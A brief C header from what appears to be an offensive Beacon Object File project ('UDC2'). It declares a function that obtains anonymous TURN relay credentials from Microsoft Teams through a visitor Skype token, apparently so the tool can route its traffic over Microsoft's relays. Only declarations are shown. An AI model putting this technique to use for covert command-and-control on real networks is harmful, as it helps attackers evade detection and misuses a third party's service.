// msteams.h — fetch anonymous TURN credentials from Microsoft Teams
// (visitor Skype token, then trap-exp tokens) over HTTPS, for the UDC2
// BOF. Uses the schannel TLS stack; the API honors
// "Accept-Encoding: identity" so no compressed-body handling is needed.
#ifndef BOF_MSTEAMS_H
#define BOF_MSTEAMS_H

#include "dfr.h"

typedef struct _TEAMS_CREDS {
    char username[192];
    char password[128];
    unsigned long long expiresUnix; // 0 = unknown
} TEAMS_CREDS;

// Wall clock: seconds since the Unix epoch.
unsigned long long msteams_now_unix(void);

// Fetches a fresh set of anonymous TURN credentials from Microsoft Teams
// (two short-lived TLS connections to teams.microsoft.com:443). Returns 0
// on success, -1 on any failure (DNS, TCP, TLS, HTTP status, JSON).
int msteams_fetch(TEAMS_CREDS* out);

#endif
